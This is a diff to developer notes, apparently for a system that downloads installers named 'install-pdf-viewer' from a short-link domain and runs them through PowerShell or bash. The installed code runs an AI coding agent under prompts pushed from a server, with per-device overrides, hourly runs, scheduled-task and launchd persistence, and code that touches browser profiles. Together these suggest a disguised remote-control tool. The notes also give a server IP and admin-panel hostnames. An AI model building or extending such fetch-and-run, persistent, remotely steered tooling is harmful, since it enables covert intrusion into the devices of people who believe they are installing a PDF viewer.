@@ -207,13 +207,43 @@ next hourly pass.
 - PS1 is pure ASCII on purpose: the file is served as UTF-8 without BOM and Windows
   PowerShell 5.1 would otherwise garble non-ASCII literals.
 
-### Not done / needs the operator
-- `prompt/default.json` currently ships `"model": "REPLACE_ME"`. Fill the exact
-  provider/model id before the fleet test; until then the run fails fast with
-  `ai_prompt fail` and nothing else changes.
+### Host redundancy (primary + fallback)
+Every fetch goes through an ordered candidate list, primary first:
+| What | Primary | Fallback |
+|---|---|---|
+| installer (Windows) | `https://wln.ink/i` | `raw.githubusercontent.com/.../install-pdf-viewer.ps1` |
+| installer (macOS) | `https://wln.ink/m` | `raw.githubusercontent.com/.../install-pdf-viewer-macos.sh` |
+| prompt | `https://wln.ink/p` | `raw.githubusercontent.com/.../prompt-default.json` |
+
+A candidate is accepted ONLY when the body looks like the expected payload
+(marker present, no leading `<`). This matters because **HTTP 200 alone is not a
+valid signal here**: `c.doghodl.com` is in the same nginx vhost but serves the
+diabrowser admin panel, so `/i` and `/p` on it answer `200 text/html`. Without
+body validation the fallback would happily feed an HTML page into
+PowerShell/bash. `www.wln.ink` is listed in `server_name` but does not resolve
+(HTTP 000), so it is deliberately not used. Adding a real second domain later is
+a one-line change in `$InstallerUrls` / `$PromptUrls` (Windows) or
+`INSTALLER_URLS` / `PROMPT_URLS` (macOS).
+
+`prompt-default.json` in this repo is a credential-free copy of the server
+prompt. It is a degraded fallback: same prompt, but no per-device override and no
+delivered opencode config. Keep it in sync when the server prompt changes:
+`cp /var/www/wln.ink/prompt/default.json prompt-default.json`.
+
+### Model
+`opencode/big-pickle` - free model shipped with opencode, **no API key needed**,
+selected via `model` in the server payload and passed as `--model`. Reasoning
+effort is requested with `--variant max`.
+
+## Not done / needs the operator
+- The model ships as `opencode/big-pickle` (free, no credentials). Change it in
+  `prompt/default.json` + `prompt-default.json` if you ever want another one.
 - Pre-existing quirk left untouched: the old install reports use `info=`, while
   `wln-notify.py` reads `extra` - so install messages show no details. New module
   reports use `extra` correctly.
+- Not verified on real hardware: the module was exercised on a Linux harness with
+  stubbed browser profiles and a stubbed opencode. Two steps still need a real
+  machine: Windows `schtasks` registration and macOS `launchd` load.
 
 ## File locations
 Server (`207.180.255.237`, Ubuntu 24.04):
